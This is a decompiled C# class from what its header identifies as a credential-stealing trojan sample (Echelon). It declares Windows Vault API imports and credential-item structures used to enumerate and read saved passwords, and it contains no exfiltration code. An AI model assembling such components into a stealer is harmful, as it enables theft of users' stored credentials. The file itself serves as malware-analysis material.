// Decompiled with JetBrains decompiler
// Type: Echelon.VaultCli
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Runtime.InteropServices;

namespace Echelon
{
  internal class VaultCli
  {
    [DllImport("vaultcli.dll")]
    public static extern int VaultOpenVault(
      ref Guid vaultGuid,
      uint offset,
      ref IntPtr vaultHandle);

    [DllImport("vaultcli.dll")]
    public static extern int VaultCloseVault(ref IntPtr vaultHandle);

    [DllImport("vaultcli.dll")]
    public static extern int VaultFree(ref IntPtr vaultHandle);

    [DllImport("vaultcli.dll")]
    public static extern int VaultEnumerateVaults(
      int offset,
      ref int vaultCount,
      ref IntPtr vaultGuid);

    [DllImport("vaultcli.dll")]
    public static extern int VaultEnumerateItems(
      IntPtr vaultHandle,
      int chunkSize,
      ref int vaultItemCount,
      ref IntPtr vaultItem);

    [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
    public static extern int VaultGetItem_WIN8(
      IntPtr vaultHandle,
      ref Guid schemaId,
      IntPtr pResourceElement,
      IntPtr pIdentityElement,
      IntPtr pPackageSid,
      IntPtr zero,
      int arg6,
      ref IntPtr passwordVaultPtr);

    [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
    public static extern int VaultGetItem_WIN7(
      IntPtr vaultHandle,
      ref Guid schemaId,
      IntPtr pResourceElement,
      IntPtr pIdentityElement,
      IntPtr zero,
      int arg5,
      ref IntPtr passwordVaultPtr);

    public enum VAULT_ELEMENT_TYPE
    {
      Undefined = -1, // 0xFFFFFFFF
      Boolean = 0,
      Short = 1,
      UnsignedShort = 2,
      Int = 3,
      UnsignedInt = 4,
      Double = 5,
      Guid = 6,
      String = 7,
      ByteArray = 8,
      TimeStamp = 9,
      ProtectedArray = 10, // 0x0000000A
      Attribute = 11, // 0x0000000B
      Sid = 12, // 0x0000000C
      Last = 13, // 0x0000000D
    }

    public enum VAULT_SCHEMA_ELEMENT_ID
    {
      Illegal = 0,
      Resource = 1,
      Identity = 2,
      Authenticator = 3,
      Tag = 4,
      PackageSid = 5,
      AppStart = 100, // 0x00000064
      AppEnd = 10000, // 0x00002710
    }

    public struct VAULT_ITEM_WIN8
    {
      public Guid SchemaId;
      public IntPtr pszCredentialFriendlyName;
      public IntPtr pResourceElement;
      public IntPtr pIdentityElement;
      public IntPtr pAuthenticatorElement;
      public IntPtr pPackageSid;
      public ulong LastModified;
      public uint dwFlags;
      public uint dwPropertiesCount;
      public IntPtr pPropertyElements;
    }

    public struct VAULT_ITEM_WIN7
    {
      public Guid SchemaId;
      public IntPtr pszCredentialFriendlyName;
      public IntPtr pResourceElement;
      public IntPtr pIdentityElement;
      public IntPtr pAuthenticatorElement;
      public ulong LastModified;
      public uint dwFlags;
      public uint dwPropertiesCount;
      public IntPtr pPropertyElements;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct VAULT_ITEM_ELEMENT
    {
      [FieldOffset(0)]
      public VaultCli.VAULT_SCHEMA_ELEMENT_ID SchemaElementId;
      [FieldOffset(8)]
      public VaultCli.VAULT_ELEMENT_TYPE Type;
    }
  }
}
